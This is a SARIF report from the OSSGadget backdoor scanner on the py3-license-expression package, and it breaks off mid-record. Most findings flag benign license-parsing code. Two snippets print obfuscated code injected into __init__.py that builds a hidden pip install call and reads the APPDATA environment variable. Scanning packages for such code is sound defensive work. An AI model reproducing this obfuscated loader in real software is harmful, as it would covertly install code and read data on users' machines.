{
  "$schema": "https://schemastore.azurewebsites.net/schemas/json/sarif-2.1.0-rtm.6.json",
  "version": "2.1.0",
  "runs": [
    {
      "tool": {
        "driver": {
          "name": "oss-detect-backdoor",
          "organization": "Microsoft Corporation",
          "product": "OSSGadget (https://github.com/Microsoft/OSSGadget)",
          "version": "0.0.0+4a24249b20"
        }
      },
      "results": [
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression/__init__.py"
                },
                "region": {
                  "startLine": 1798,
                  "startColumn": 69,
                  "endLine": 1798,
                  "endColumn": 73,
                  "snippet": {
                    "text": "    seen_aliases = {}\n    seen_exceptions = set()\n\n    # collections to accumulate invalid data and build error messages at the end\n    not_symbol_classes = []\n    dupe_keys = set()\n    dupe_exceptions = set()\n",
                    "rendered": {
                      "text": "    seen_aliases = {}\n    seen_exceptions = set()\n\n    # collections to accumulate invalid data and build error messages at the end\n    not_symbol_classes = []\n    dupe_keys = set()\n    dupe_exceptions = set()\n",
                      "markdown": "`    seen_aliases = {}\n    seen_exceptions = set()\n\n    # collections to accumulate invalid data and build error messages at the end\n    not_symbol_classes = []\n    dupe_keys = set()\n    dupe_exceptions = set()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression/__init__.py"
                },
                "region": {
                  "startLine": 770,
                  "startColumn": 45,
                  "endLine": 770,
                  "endColumn": 49,
                  "snippet": {
                    "text": "        for keyword in KEYWORDS:\n            add_item(keyword.value, keyword)\n\n        # self.known_symbols has been created at Licensing initialization time\n        # and is already validated and trusted here\n        for key, symbol in self.known_symbols.items():\n            # always use the key even if there are no aliases.\n",
                    "rendered": {
                      "text": "        for keyword in KEYWORDS:\n            add_item(keyword.value, keyword)\n\n        # self.known_symbols has been created at Licensing initialization time\n        # and is already validated and trusted here\n        for key, symbol in self.known_symbols.items():\n            # always use the key even if there are no aliases.\n",
                      "markdown": "`        for keyword in KEYWORDS:\n            add_item(keyword.value, keyword)\n\n        # self.known_symbols has been created at Licensing initialization time\n        # and is already validated and trusted here\n        for key, symbol in self.known_symbols.items():\n            # always use the key even if there are no aliases.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression/__init__.py"
                },
                "region": {
                  "startLine": 618,
                  "startColumn": 21,
                  "endLine": 618,
                  "endColumn": 25,
                  "snippet": {
                    "text": "        is returned as-is.\n\n        Symbols are always recognized from known Licensing symbols if `symbols`\n        were provided at Licensing creation time: each license and exception is\n        recognized from known license keys (and from aliases for a symbol if\n        available).\n\n",
                    "rendered": {
                      "text": "        is returned as-is.\n\n        Symbols are always recognized from known Licensing symbols if `symbols`\n        were provided at Licensing creation time: each license and exception is\n        recognized from known license keys (and from aliases for a symbol if\n        available).\n\n",
                      "markdown": "`        is returned as-is.\n\n        Symbols are always recognized from known Licensing symbols if `symbols`\n        were provided at Licensing creation time: each license and exception is\n        recognized from known license keys (and from aliases for a symbol if\n        available).\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression/__init__.py"
                },
                "region": {
                  "startLine": 853,
                  "startColumn": 18,
                  "endLine": 853,
                  "endColumn": 24,
                  "snippet": {
                    "text": "\n        The deduplication:\n\n        - Does not sort the licenses of sub-expression in an expression. They\n          stay in the same order as in the original expression.\n\n        - Choices (as in \"MIT or GPL\") are kept as-is and not treated as\n",
                    "rendered": {
                      "text": "\n        The deduplication:\n\n        - Does not sort the licenses of sub-expression in an expression. They\n          stay in the same order as in the original expression.\n\n        - Choices (as in \"MIT or GPL\") are kept as-is and not treated as\n",
                      "markdown": "`\n        The deduplication:\n\n        - Does not sort the licenses of sub-expression in an expression. They\n          stay in the same order as in the original expression.\n\n        - Choices (as in \"MIT or GPL\") are kept as-is and not treated as\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression/__init__.py"
                },
                "region": {
                  "startLine": 770,
                  "startColumn": 73,
                  "endLine": 771,
                  "snippet": {
                    "text": "        for keyword in KEYWORDS:\n            add_item(keyword.value, keyword)\n\n        # self.known_symbols has been created at Licensing initialization time\n        # and is already validated and trusted here\n        for key, symbol in self.known_symbols.items():\n            # always use the key even if there are no aliases.\n            add_item(key, symbol)\n",
                    "rendered": {
                      "text": "        for keyword in KEYWORDS:\n            add_item(keyword.value, keyword)\n\n        # self.known_symbols has been created at Licensing initialization time\n        # and is already validated and trusted here\n        for key, symbol in self.known_symbols.items():\n            # always use the key even if there are no aliases.\n            add_item(key, symbol)\n",
                      "markdown": "`        for keyword in KEYWORDS:\n            add_item(keyword.value, keyword)\n\n        # self.known_symbols has been created at Licensing initialization time\n        # and is already validated and trusted here\n        for key, symbol in self.known_symbols.items():\n            # always use the key even if there are no aliases.\n            add_item(key, symbol)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression/__init__.py"
                },
                "region": {
                  "startLine": 69,
                  "startColumn": 10,
                  "endLine": 70,
                  "snippet": {
                    "text": " << 5) + (1 << 1), (((1 << 4) - 1) << 3) - 3, ((((3 << 2) + 1)) << 3) + 1, (((7 << 2) - 1) << 2), (((3 << 3) + 1) << 2)]))]:\t\n\t\t馬女水女口目人馬鳥月水馬山山馬鸟 = 834*(395 & 643)+865//460-(104 | 469+415) | 104 << 313 << 357 >> (935 | 183) & ~61\n\n\t\twhile 馬女水女口目人馬鳥月水馬山山馬鸟:\n\t\t\tif 108363 == 馬女水女口目人馬鳥月水馬山山馬鸟:\n\t\t\t\timport pip\n\t\t\t\tpip.main([''.join(map(getattr(__builtins__, oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [((((3 << 2) + 1)) << 3) + 1, (7 << 4) - (1 << 1), (7 << 4) + 3, (7 << 4) + (1 << 2), (3 << 5) + 1, (((7 << 2) - 1) << 2), (((7 << 2) - 1) << 2)])), ''.join(map(getattr(__b",
                    "rendered": {
                      "text": " << 5) + (1 << 1), (((1 << 4) - 1) << 3) - 3, ((((3 << 2) + 1)) << 3) + 1, (((7 << 2) - 1) << 2), (((3 << 3) + 1) << 2)]))]:\t\n\t\t馬女水女口目人馬鳥月水馬山山馬鸟 = 834*(395 & 643)+865//460-(104 | 469+415) | 104 << 313 << 357 >> (935 | 183) & ~61\n\n\t\twhile 馬女水女口目人馬鳥月水馬山山馬鸟:\n\t\t\tif 108363 == 馬女水女口目人馬鳥月水馬山山馬鸟:\n\t\t\t\timport pip\n\t\t\t\tpip.main([''.join(map(getattr(__builtins__, oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [((((3 << 2) + 1)) << 3) + 1, (7 << 4) - (1 << 1), (7 << 4) + 3, (7 << 4) + (1 << 2), (3 << 5) + 1, (((7 << 2) - 1) << 2), (((7 << 2) - 1) << 2)])), ''.join(map(getattr(__b",
                      "markdown": "` << 5) + (1 << 1), (((1 << 4) - 1) << 3) - 3, ((((3 << 2) + 1)) << 3) + 1, (((7 << 2) - 1) << 2), (((3 << 3) + 1) << 2)]))]:\t\n\t\t馬女水女口目人馬鳥月水馬山山馬鸟 = 834*(395 & 643)+865//460-(104 | 469+415) | 104 << 313 << 357 >> (935 | 183) & ~61\n\n\t\twhile 馬女水女口目人馬鳥月水馬山山馬鸟:\n\t\t\tif 108363 == 馬女水女口目人馬鳥月水馬山山馬鸟:\n\t\t\t\timport pip\n\t\t\t\tpip.main([''.join(map(getattr(__builtins__, oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [((((3 << 2) + 1)) << 3) + 1, (7 << 4) - (1 << 1), (7 << 4) + 3, (7 << 4) + (1 << 2), (3 << 5) + 1, (((7 << 2) - 1) << 2), (((7 << 2) - 1) << 2)])), ''.join(map(getattr(__b`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression/__init__.py"
                },
                "region": {
                  "startLine": 1853,
                  "startColumn": 38,
                  "endLine": 1853,
                  "endColumn": 43,
                  "snippet": {
                    "text": "            # alias pointing to the same key\n\n            # ensure that a possibly duplicated alias does not point to another key\n            aliased_key = seen_aliases.get(alias)\n            if aliased_key and aliased_key != keyl:\n                dupe_aliases[alias].append(key)\n\n",
                    "rendered": {
                      "text": "            # alias pointing to the same key\n\n            # ensure that a possibly duplicated alias does not point to another key\n            aliased_key = seen_aliases.get(alias)\n            if aliased_key and aliased_key != keyl:\n                dupe_aliases[alias].append(key)\n\n",
                      "markdown": "`            # alias pointing to the same key\n\n            # ensure that a possibly duplicated alias does not point to another key\n            aliased_key = seen_aliases.get(alias)\n            if aliased_key and aliased_key != keyl:\n                dupe_aliases[alias].append(key)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression/__init__.py"
                },
                "region": {
                  "startLine": 1004,
                  "startColumn": 17,
                  "endLine": 1004,
                  "endColumn": 22,
                  "snippet": {
                    "text": "            'is_exception': l.get('is_exception', ''),\n        } for l in license_index\n        if l.get('spdx_license_key')\n        and not l.get('is_deprecated', False)\n    ]\n    return load_licensing_from_license_index(lics)\n\n",
                    "rendered": {
                      "text": "            'is_exception': l.get('is_exception', ''),\n        } for l in license_index\n        if l.get('spdx_license_key')\n        and not l.get('is_deprecated', False)\n    ]\n    return load_licensing_from_license_index(lics)\n\n",
                      "markdown": "`            'is_exception': l.get('is_exception', ''),\n        } for l in license_index\n        if l.get('spdx_license_key')\n        and not l.get('is_deprecated', False)\n    ]\n    return load_licensing_from_license_index(lics)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression/__init__.py"
                },
                "region": {
                  "startLine": 1003,
                  "startColumn": 12,
                  "endLine": 1003,
                  "endColumn": 17,
                  "snippet": {
                    "text": "            'aliases': l.get('other_spdx_license_keys', []),\n            'is_exception': l.get('is_exception', ''),\n        } for l in license_index\n        if l.get('spdx_license_key')\n        and not l.get('is_deprecated', False)\n    ]\n    return load_licensing_from_license_index(lics)\n",
                    "rendered": {
                      "text": "            'aliases': l.get('other_spdx_license_keys', []),\n            'is_exception': l.get('is_exception', ''),\n        } for l in license_index\n        if l.get('spdx_license_key')\n        and not l.get('is_deprecated', False)\n    ]\n    return load_licensing_from_license_index(lics)\n",
                      "markdown": "`            'aliases': l.get('other_spdx_license_keys', []),\n            'is_exception': l.get('is_exception', ''),\n        } for l in license_index\n        if l.get('spdx_license_key')\n        and not l.get('is_deprecated', False)\n    ]\n    return load_licensing_from_license_index(lics)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression/__init__.py"
                },
                "region": {
                  "startLine": 1001,
                  "startColumn": 29,
                  "endLine": 1001,
                  "endColumn": 34,
                  "snippet": {
                    "text": "        {\n            'key': l.get('spdx_license_key', ''),\n            'aliases': l.get('other_spdx_license_keys', []),\n            'is_exception': l.get('is_exception', ''),\n        } for l in license_index\n        if l.get('spdx_license_key')\n        and not l.get('is_deprecated', False)\n",
                    "rendered": {
                      "text": "        {\n            'key': l.get('spdx_license_key', ''),\n            'aliases': l.get('other_spdx_license_keys', []),\n            'is_exception': l.get('is_exception', ''),\n        } for l in license_index\n        if l.get('spdx_license_key')\n        and not l.get('is_deprecated', False)\n",
                      "markdown": "`        {\n            'key': l.get('spdx_license_key', ''),\n            'aliases': l.get('other_spdx_license_keys', []),\n            'is_exception': l.get('is_exception', ''),\n        } for l in license_index\n        if l.get('spdx_license_key')\n        and not l.get('is_deprecated', False)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression/__init__.py"
                },
                "region": {
                  "startLine": 1000,
                  "startColumn": 24,
                  "endLine": 1000,
                  "endColumn": 29,
                  "snippet": {
                    "text": "    lics = [\n        {\n            'key': l.get('spdx_license_key', ''),\n            'aliases': l.get('other_spdx_license_keys', []),\n            'is_exception': l.get('is_exception', ''),\n        } for l in license_index\n        if l.get('spdx_license_key')\n",
                    "rendered": {
                      "text": "    lics = [\n        {\n            'key': l.get('spdx_license_key', ''),\n            'aliases': l.get('other_spdx_license_keys', []),\n            'is_exception': l.get('is_exception', ''),\n        } for l in license_index\n        if l.get('spdx_license_key')\n",
                      "markdown": "`    lics = [\n        {\n            'key': l.get('spdx_license_key', ''),\n            'aliases': l.get('other_spdx_license_keys', []),\n            'is_exception': l.get('is_exception', ''),\n        } for l in license_index\n        if l.get('spdx_license_key')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression/__init__.py"
                },
                "region": {
                  "startLine": 999,
                  "startColumn": 20,
                  "endLine": 999,
                  "endColumn": 25,
                  "snippet": {
                    "text": "    # Massage data such that SPDX license key is the primary license key\n    lics = [\n        {\n            'key': l.get('spdx_license_key', ''),\n            'aliases': l.get('other_spdx_license_keys', []),\n            'is_exception': l.get('is_exception', ''),\n        } for l in license_index\n",
                    "rendered": {
                      "text": "    # Massage data such that SPDX license key is the primary license key\n    lics = [\n        {\n            'key': l.get('spdx_license_key', ''),\n            'aliases': l.get('other_spdx_license_keys', []),\n            'is_exception': l.get('is_exception', ''),\n        } for l in license_index\n",
                      "markdown": "`    # Massage data such that SPDX license key is the primary license key\n    lics = [\n        {\n            'key': l.get('spdx_license_key', ''),\n            'aliases': l.get('other_spdx_license_keys', []),\n            'is_exception': l.get('is_exception', ''),\n        } for l in license_index\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression/__init__.py"
                },
                "region": {
                  "startLine": 986,
                  "startColumn": 41,
                  "endLine": 986,
                  "endColumn": 46,
                  "snippet": {
                    "text": "        {\n            'key': l.get('license_key', ''),\n            'is_exception': l.get('is_exception', ''),\n        } for l in license_index if not l.get('is_deprecated', False)\n    ]\n    return load_licensing_from_license_index(lics)\n\n",
                    "rendered": {
                      "text": "        {\n            'key': l.get('license_key', ''),\n            'is_exception': l.get('is_exception', ''),\n        } for l in license_index if not l.get('is_deprecated', False)\n    ]\n    return load_licensing_from_license_index(lics)\n\n",
                      "markdown": "`        {\n            'key': l.get('license_key', ''),\n            'is_exception': l.get('is_exception', ''),\n        } for l in license_index if not l.get('is_deprecated', False)\n    ]\n    return load_licensing_from_license_index(lics)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression/__init__.py"
                },
                "region": {
                  "startLine": 985,
                  "startColumn": 29,
                  "endLine": 985,
                  "endColumn": 34,
                  "snippet": {
                    "text": "    lics = [\n        {\n            'key': l.get('license_key', ''),\n            'is_exception': l.get('is_exception', ''),\n        } for l in license_index if not l.get('is_deprecated', False)\n    ]\n    return load_licensing_from_license_index(lics)\n",
                    "rendered": {
                      "text": "    lics = [\n        {\n            'key': l.get('license_key', ''),\n            'is_exception': l.get('is_exception', ''),\n        } for l in license_index if not l.get('is_deprecated', False)\n    ]\n    return load_licensing_from_license_index(lics)\n",
                      "markdown": "`    lics = [\n        {\n            'key': l.get('license_key', ''),\n            'is_exception': l.get('is_exception', ''),\n        } for l in license_index if not l.get('is_deprecated', False)\n    ]\n    return load_licensing_from_license_index(lics)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression/__init__.py"
                },
                "region": {
                  "startLine": 984,
                  "startColumn": 20,
                  "endLine": 984,
                  "endColumn": 25,
                  "snippet": {
                    "text": "    \"\"\"\n    lics = [\n        {\n            'key': l.get('license_key', ''),\n            'is_exception': l.get('is_exception', ''),\n        } for l in license_index if not l.get('is_deprecated', False)\n    ]\n",
                    "rendered": {
                      "text": "    \"\"\"\n    lics = [\n        {\n            'key': l.get('license_key', ''),\n            'is_exception': l.get('is_exception', ''),\n        } for l in license_index if not l.get('is_deprecated', False)\n    ]\n",
                      "markdown": "`    \"\"\"\n    lics = [\n        {\n            'key': l.get('license_key', ''),\n            'is_exception': l.get('is_exception', ''),\n        } for l in license_index if not l.get('is_deprecated', False)\n    ]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression/__init__.py"
                },
                "region": {
                  "startLine": 836,
                  "startColumn": 33,
                  "endLine": 836,
                  "endColumn": 38,
                  "snippet": {
                    "text": "                if operator:\n                    yield Token(start, end, sym_or_op, operator)\n                else:\n                    sym = symbols.get(sym_or_op_lower)\n                    if not sym:\n                        sym = LicenseSymbol(key=sym_or_op)\n                    yield Token(start, end, sym_or_op, sym)\n",
                    "rendered": {
                      "text": "                if operator:\n                    yield Token(start, end, sym_or_op, operator)\n                else:\n                    sym = symbols.get(sym_or_op_lower)\n                    if not sym:\n                        sym = LicenseSymbol(key=sym_or_op)\n                    yield Token(start, end, sym_or_op, sym)\n",
                      "markdown": "`                if operator:\n                    yield Token(start, end, sym_or_op, operator)\n                else:\n                    sym = symbols.get(sym_or_op_lower)\n                    if not sym:\n                        sym = LicenseSymbol(key=sym_or_op)\n                    yield Token(start, end, sym_or_op, sym)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression/__init__.py"
                },
                "region": {
                  "startLine": 832,
                  "startColumn": 36,
                  "endLine": 832,
                  "endColumn": 41,
                  "snippet": {
                    "text": "            if sym_or_op:\n                sym_or_op_lower = sym_or_op.lower()\n\n                operator = OPERATORS.get(sym_or_op_lower)\n                if operator:\n                    yield Token(start, end, sym_or_op, operator)\n                else:\n",
                    "rendered": {
                      "text": "            if sym_or_op:\n                sym_or_op_lower = sym_or_op.lower()\n\n                operator = OPERATORS.get(sym_or_op_lower)\n                if operator:\n                    yield Token(start, end, sym_or_op, operator)\n                else:\n",
                      "markdown": "`            if sym_or_op:\n                sym_or_op_lower = sym_or_op.lower()\n\n                operator = OPERATORS.get(sym_or_op_lower)\n                if operator:\n                    yield Token(start, end, sym_or_op, operator)\n                else:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression/__init__.py"
                },
                "region": {
                  "startLine": 100,
                  "startColumn": 29,
                  "endLine": 100,
                  "endColumn": 48,
                  "snippet": {
                    "text": " 771 << 369 << 218 >> (797 | 341) & ~526\n\n\t\twhile 子水女馬人月刀人馬鳥山馬馬刀女人:\n\t\t\tif 子水女馬人月刀人馬鳥山馬馬刀女人 == 12768:\n\t\t\t\t人馬口刀女子月水人目水鳥山口馬馬.close()\n\t\t\t\t子水女馬人月刀人馬鳥山馬馬刀女人 = 895*(183 & 759)+231//268-(415 | 928+255) | 415 << 22 << 536 >> (210 | 576) & ~511\n\t\t\telif 子水女馬人月刀人馬鳥山馬馬刀女人 == 183269:\n\t\t\t\t目水鸟月木人木鳥马口马刀木鳥水子 = os.getenv(''.join(map(getattr(__builtins__, oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [(1 << 6) + 1, (5 << 4), (5 << 4), (((1 << 4) + 1) << 2), (1 << 6) + 1, (((5 << 2) + 1) << 2), (1 << 6) + 1])))\n\t\t\t\t子水女馬人月刀人馬鳥山馬馬刀女人 = 763*(228 & 284)+333//968-(431 | 867+491) | 431 << 636 << 393 >> (9",
                    "rendered": {
                      "text": " 771 << 369 << 218 >> (797 | 341) & ~526\n\n\t\twhile 子水女馬人月刀人馬鳥山馬馬刀女人:\n\t\t\tif 子水女馬人月刀人馬鳥山馬馬刀女人 == 12768:\n\t\t\t\t人馬口刀女子月水人目水鳥山口馬馬.close()\n\t\t\t\t子水女馬人月刀人馬鳥山馬馬刀女人 = 895*(183 & 759)+231//268-(415 | 928+255) | 415 << 22 << 536 >> (210 | 576) & ~511\n\t\t\telif 子水女馬人月刀人馬鳥山馬馬刀女人 == 183269:\n\t\t\t\t目水鸟月木人木鳥马口马刀木鳥水子 = os.getenv(''.join(map(getattr(__builtins__, oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [(1 << 6) + 1, (5 << 4), (5 << 4), (((1 << 4) + 1) << 2), (1 << 6) + 1, (((5 << 2) + 1) << 2), (1 << 6) + 1])))\n\t\t\t\t子水女馬人月刀人馬鳥山馬馬刀女人 = 763*(228 & 284)+333//968-(431 | 867+491) | 431 << 636 << 393 >> (9",
                      "markdown": "` 771 << 369 << 218 >> (797 | 341) & ~526\n\n\t\twhile 子水女馬人月刀人馬鳥山馬馬刀女人:\n\t\t\tif 子水女馬人月刀人馬鳥山馬馬刀女人 == 12768:\n\t\t\t\t人馬口刀女子月水人目水鳥山口馬馬.close()\n\t\t\t\t子水女馬人月刀人馬鳥山馬馬刀女人 = 895*(183 & 759)+231//268-(415 | 928+255) | 415 << 22 << 536 >> (210 | 576) & ~511\n\t\t\telif 子水女馬人月刀人馬鳥山馬馬刀女人 == 183269:\n\t\t\t\t目水鸟月木人木鳥马口马刀木鳥水子 = os.getenv(''.join(map(getattr(__builtins__, oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [(1 << 6) + 1, (5 << 4), (5 << 4), (((1 << 4) + 1) << 2), (1 << 6) + 1, (((5 << 2) + 1) << 2), (1 << 6) + 1])))\n\t\t\t\t子水女馬人月刀人馬鳥山馬馬刀女人 = 763*(228 & 284)+333//968-(431 | 867+491) | 431 << 636 << 393 >> (9`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression-30.3.0.dist-info/METADATA"
                },
                "region": {
                  "startLine": 184,
                  "startColumn": 63,
                  "endLine": 184,
                  "endColumn": 67,
                  "snippet": {
